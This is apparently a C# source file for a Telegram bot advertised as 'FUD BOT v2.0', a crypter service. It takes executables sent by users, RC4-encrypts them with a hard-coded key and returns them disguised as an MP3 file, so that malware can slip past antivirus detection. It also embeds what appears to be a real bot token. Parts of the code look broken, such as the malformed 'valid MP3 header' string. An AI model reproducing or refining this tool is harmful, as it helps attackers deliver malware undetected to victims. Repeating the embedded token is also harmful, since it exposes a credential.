using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddHttpClient();
var app = builder.Build();

const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";

app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory) => {
    using var reader = new StreamReader(ctx.Request.Body);
    var json = await reader.ReadToEndAsync();
    
    try {
        var update = JsonSerializer.Deserialize<JsonElement>(json);
        if (update.TryGetProperty("message", out var msg) && 
            msg.TryGetProperty("document", out var doc) && 
            doc.TryGetProperty("file_id", out var fileId)) {
            
            var client = clientFactory.CreateClient();
            
            // Get file path
            var fileResp = await client.GetStringAsync($"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={fileId.GetString()}");
            var fileData = JsonSerializer.Deserialize<JsonElement>(fileResp);
            
            if (fileData.GetProperty("ok").GetBoolean() && 
                fileData.GetProperty("result").TryGetProperty("file_path", out var filePath)) {
                
                // Download EXE
                var exeBytes = await client.GetByteArrayAsync($"https://api.telegram.org/file/bot{BOT_TOKEN}/{filePath.GetString()}");
                
                // FUD MAGIC (RC4 + MP3)
                var fudMp3 = FudMp3(exeBytes);
                
                // Send back
                using var form = new MultipartFormDataContent();
                if (msg.TryGetProperty("chat", out var chat) && chat.TryGetProperty("id", out var chatId)) {
                    form.Add(new StringContent(chatId.GetInt64().ToString()), "chat_id");
                }
                form.Add(new StringContent("✅ FUD MP3!\n🔑 Key: FUD2026KEY!\n📱 Decrypt: RC4 + skip ID3"), "caption");
                var mp3Content = new ByteArrayContent(fudMp3);
                mp3Content.Headers.ContentType = System.Net.Http.Headers.MediaTypeHeaderValue.Parse("audio/mpeg");
                form.Add(mp3Content, "document", "fud.mp3");
                
                await client.PostAsync($"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", form);
            }
        }
    } catch { }
    return Results.Ok();
});

app.MapGet("/", () => "🚀 FUD BOT v2.0 LIVE!");
app.Run("0.0.0.0:10000");

// FUD ENGINE - SINGLE FILE, NO DUPLICATES
static byte[] FudMp3(byte[] exe) {
    var key = Encoding.UTF8.GetBytes("FUD2026KEY!");
    var encrypted = Rc4Encrypt(exe, key);
    var id3Header = Encoding.ASCII.GetBytes("ID3v2.3\x00\x00\x00\x40\x00\x00\x10\x00\x00\x00\x00\x00"); // Valid MP3 header
    var result = new byte[id3Header.Length + encrypted.Length];
    id3Header.CopyTo(result, 0);
    encrypted.CopyTo(result, id3Header.Length);
    return result;
}

static byte[] Rc4Encrypt(byte[] data, byte[] key) {
    var sbox = Enumerable.Range(0, 256).Select(i => (byte)i).ToArray();
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + sbox[i] + key[i % key.Length]) % 256;
        (sbox[i], sbox[j]) = (sbox[j], sbox[i]);
    }
    var output = new byte[data.Length];
    int i2 = 0, j2 = 0;
    for (int k = 0; k < data.Length; k++) {
        i2 = (i2 + 1) % 256;
        j2 = (j2 + sbox[i2]) % 256;
        (sbox[i2], sbox[j2]) = (sbox[j2], sbox[i2]);
        output[k] = (byte)(data[k] ^ sbox[(sbox[i2] + sbox[j2]) % 256]);
    }
    return output;
}
